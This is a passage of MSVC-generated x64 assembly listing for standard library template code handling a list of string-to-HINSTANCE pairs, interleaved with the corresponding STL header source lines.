; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

	mov	rdx, QWORD PTR [r8]
	mov	rcx, rdi
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 702  :     }

	mov	rbx, QWORD PTR [rsp+48]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

	mov	QWORD PTR [rdi+32], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 702  :     }

	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ENDP ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::construct<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::pair<char const *,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z PROC ; std::forward<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z ENDP ; std::forward<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@_N@std@@YA$$QEA_NAEA_N@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@_N@std@@YA$$QEA_NAEA_N@Z PROC		; std::forward<bool>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@_N@std@@YA$$QEA_NAEA_N@Z ENDP		; std::forward<bool>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z
_TEXT	SEGMENT
_Location$ = 48
??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z PROC ; std::destroy_at<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >, COMDAT

; 299  : _CONSTEXPR20 void destroy_at(_Ty* const _Location) noexcept /* strengthened */ {

$LN59:
	push	rbx
	sub	rsp, 32					; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rcx+24]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 299  : _CONSTEXPR20 void destroy_at(_Ty* const _Location) noexcept /* strengthened */ {

	mov	rbx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN30@destroy_at
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rcx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN44@destroy_at

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN41@destroy_at

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN44@destroy_at:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN30@destroy_at:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 308  : }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN41@destroy_at:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN56@destroy_at:
??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z ENDP ; std::destroy_at<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ PROC ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::~pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>, COMDAT
$LN48:
	push	rbx
	sub	rsp, 32					; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rcx+24]
	mov	rbx, rcx
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN21@pair
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rcx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN35@pair

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN32@pair

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN35@pair:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN21@pair:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN32@pair:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN45@pair:
??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ ENDP ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::~pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@$0A@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@AEBV10@@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@$0A@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@AEBV10@@Z PROC ; std::construct_at<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@$0A@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@AEBV10@@Z ENDP ; std::construct_at<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z PROC ; std::forward<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z ENDP ; std::forward<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEBQEAU10@@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEBQEAU10@@Z PROC ; std::construct_at<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEBQEAU10@@Z ENDP ; std::construct_at<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z
_TEXT	SEGMENT
_Left$ = 48
_Left_size$ = 56
_Right$ = 64
_Right_size$ = 72
??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z PROC ; std::_Traits_equal<std::char_traits<char> >, COMDAT

; 544  :     _In_reads_(_Right_size) const _Traits_ptr_t<_Traits> _Right, const size_t _Right_size) noexcept {

$LN11:
	sub	rsp, 40					; 00000028H
	mov	rax, r8

; 545  :     // compare [_Left, _Left + _Left_size) to [_Right, _Right + _Right_size) for equality using _Traits
; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rdx, r9
	jne	SHORT $LN3@Traits_equ

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rdx
	mov	rdx, rax
	call	memcmp

; 545  :     // compare [_Left, _Left + _Left_size) to [_Right, _Right + _Right_size) for equality using _Traits
; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	jne	SHORT $LN3@Traits_equ
	mov	al, 1

; 547  : }

	add	rsp, 40					; 00000028H
	ret	0
$LN3@Traits_equ:

; 545  :     // compare [_Left, _Left + _Left_size) to [_Right, _Right + _Right_size) for equality using _Traits
; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	xor	al, al

; 547  : }

	add	rsp, 40					; 00000028H
	ret	0
??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z ENDP ; std::_Traits_equal<std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$dead$ = 56
??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z PROC ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::`scalar deleting destructor', COMDAT
$LN55:
	push	rbx
	sub	rsp, 32					; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rcx+24]
	mov	rbx, rcx
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN27@scalar
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rcx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN41@scalar

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
